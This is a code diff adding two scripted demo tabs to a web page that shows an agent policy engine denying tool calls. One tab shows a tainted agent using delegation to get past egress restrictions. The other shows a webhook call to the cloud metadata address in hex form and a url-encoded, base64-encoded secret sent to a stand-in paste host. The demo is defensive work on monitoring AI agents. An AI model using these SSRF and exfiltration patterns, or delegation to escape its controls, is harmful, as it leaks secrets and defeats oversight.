@@ -301,10 +301,85 @@
     con.busy = false;
   }
 
+  /* ---------- TAB 5: confused-deputy delegation (v10) ---------- */
+  // Outcomes mirror what PolicyEngine.evaluate_call returns for this sequence
+  // (see tests/test_delegation_guard.py); nothing here calls the engine.
+  async function runTab5(con) {
+    if (con.busy) return; con.busy = true; con.clear();
+    var taintSrc = (await sha256hex("taint|read_external_url")).slice(0, 16);
+    con.write('$ agent A  <span class="dim">key=agk_lab_A…  session=a</span>', "muted");
+    await sleep(300);
+    con.write('→ read_internal_secrets  <span class="dim">SENSITIVE_READ</span>', "step");
+    con.write("  allowed · session a now carries sensitive history", "ok");
+    await sleep(350);
+    con.write('→ read_external_url {url}  <span class="dim">untrusted ingest</span>', "step");
+    con.write('  session a TAINTED · agw1. caveat appended → <span class="bad">allow_egress=false</span>  taint_source=' + taintSrc + "…", "warn");
+    await sleep(450);
+    con.write('\n→ delegate_task {to_agent_key: agk_lab_B…, to_session_id: b}  <span class="dim">hand-off to a clean peer</span>', "step");
+    await sleep(350);
+    con.write("  lattice meet A ∧ B → allow_egress=false · allow_sampling=false · sensitive_read=true · taint_sources=[" + taintSrc.slice(0, 8) + "…]", "warn");
+    con.write("  B's new agw1. token carries A's deny caveats under the chained HMAC — B cannot strip them without the root key", "dim");
+    await sleep(500);
+    con.write('→ B: send_email  <span class="dim">(session b)</span>', "step");
+    con.write('  post_taint_outbound_gated  <span class="tag bad">DENIED</span>', "bad");
+    await sleep(400);
+    con.write('→ B: send_email  <span class="dim">(fresh session b2 — token looks clean)</span>', "step");
+    await sleep(300);
+    con.write('  confused_deputy_delegation_blocked  <span class="dim">≈ AML.T0051 / AML.T0086 · code -32036</span>  <span class="tag bad">DENIED</span>', "bad");
+    con.write("  B's principal received a hand-off from a barred agent; egress stays closed in every B session", "dim");
+    await sleep(450);
+    con.write('\n→ B: delegate_task {to_agent_key: agk_lab_A…, to_session_id: a2}  <span class="dim">cycle B → A</span>', "step");
+    con.write("  meet only moves down the lattice → a2 inherits allow_egress=false (the cycle cannot restore egress)", "warn");
+    con.write('→ A: send_email  <span class="dim">(session a2)</span>', "step");
+    con.write('  confused_deputy_delegation_blocked  <span class="tag bad">DENIED</span>', "bad");
+    await sleep(500);
+    con.write('\n$ benign control  <span class="dim">clean agent P → clean agent Q</span>', "muted");
+    con.write("→ delegate_task  meet → allow_egress=true", "step");
+    con.write('→ Q: send_email  <span class="tag ok">ALLOWED</span>', "ok");
+    await sleep(300);
+    con.write("\n  Deterministic: a lattice meet and an HMAC check, no model in the loop. Sprint run: clean_delegation benign workflow p50 0.120 ms CPU per decision, 0 of 150 denied.", "dim");
+    con.busy = false;
+  }
+
+  /* ---------- TAB 6: obfuscated canary exfiltration (v10) ---------- */
+  async function runTab6(con) {
+    if (con.busy) return; con.busy = true; con.clear();
+    var secret = "secret_value_123"; // lab fixture, not real
+    var tag = (await sha256hex("canary|sess|1|read_internal_secrets")).slice(0, 12);
+    con.write('$ tools/call read_internal_secrets  <span class="dim">step 1 · SENSITIVE_READ</span>', "step");
+    await sleep(350);
+    con.write('  result watermarked: zero-width HMAC tag bound to (session, step 1, read_internal_secrets) · tag=' + tag + '…  <span class="tag ok">CANARY</span>', "ok");
+    con.write("  secret fingerprinted as salted 8-char n-gram digests of raw · base64 · hex · url · ws-stripped forms", "ok");
+    await sleep(500);
+    con.write('\n→ send_webhook {url: "http://0xA9FEA9FE/latest/meta-data"}', "step");
+    await sleep(300);
+    con.write("  egress_uri_guard: canonical host 169.254.169.254 · reasons: non_canonical_address_encoding, cloud_metadata_target", "bad");
+    con.write('  ssrf_boundary_violation  <span class="dim">≈ AML.T0053</span>  <span class="tag bad">DENIED</span>', "bad");
+    await sleep(500);
+    var layered = encodeURIComponent(b64(secret + "​‌"));
+    con.write('\n→ send_webhook {url: "https://paste.example.net/u", payload: "' + esc(layered.slice(0, 28)) + '…"}', "step");
+    con.write('  <span class="dim">payload = url_encode(base64(watermarked secret))</span>', "dim");
+    await sleep(350);
+    con.write("  egress_uri_guard: public host → allow (the URI guard blocks internal and metadata targets, not public names)", "muted");
+    await sleep(300);
+    con.write("  deobfuscate: url-decode → base64 run → n-gram digest match on the secret's base64 form", "bad");
+    con.write('  deobfuscated_exfil_detected  <span class="dim">≈ AML.T0086 · code -32031</span>  <span class="tag bad">DENIED</span>', "bad");
+    await sleep(350);
+    con.write('  session <span class="warn">TAINTED</span> (deobfuscated_exfil) · registered lab key + child frozen for <span class="bad">15:00</span>', "bad");
+    con.write('  <span class="dim">frozen_agents=[lab-assistant-1, lab-worker-child] · unregistered keys are never frozen</span>');
+    await sleep(400);
+    var prev = (await sha256hex("entry|4")).slice(0, 12), head = (await sha256hex("entry|5|" + prev)).slice(0, 12);
+    con.write('  audit_chain: seq=5  prev_hash=' + prev + '…  entry_hash=' + head + '…  <span class="tag ok">CHAINED</span>', "ok");
+    con.write("  a raw copy of the watermark would have hit canary_watermark_exfil (-32037) with origin step 1 as provenance", "dim");
+    await sleep(300);
+    con.write("\n  Decoded inline, deterministically — no model in the loop. Per-decision cost of the payload check varies with argument size; see the sprint report for measured benign latency.", "dim");
+    con.busy = false;
+  }
+
   /* ---------- wire run / reset buttons ---------- */
   var cons = {};
   function con(id) { if (!cons[id]) cons[id] = new Console("out-" + id); return cons[id]; }
-  var runners = { "1": runTab1, "2": runTab2, "4": runTab4 };
+  var runners = { "1": runTab1, "2": runTab2, "4": runTab4, "5": runTab5, "6": runTab6 };
   $all("[data-run]").forEach(function (b) {
     b.addEventListener("click", function () { runners[b.getAttribute("data-run")](con(b.getAttribute("data-run"))); });
   });
@@ -320,6 +395,13 @@
   $("#copy-template").addEventListener("click", function () {
     var text = $("#email-template").textContent;
     var done = function () { toast("Template copied — opening your email…"); setTimeout(function () { window.location.href = EMAIL; }, 650); };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(done, function () { fallbackCopy(text); done(); });
+    } else { fallbackCopy(text); done(); }
+  });
+  $("#copy-verify").addEventListener("click", function () {
+    var text = $("#verify-snippet").textContent;
+    var done = function () { toast("Commands copied"); };
     if (navigator.clipboard && navigator.clipboard.writeText) {
       navigator.clipboard.writeText(text).then(done, function () { fallbackCopy(text); done(); });
     } else { fallbackCopy(text); done(); }
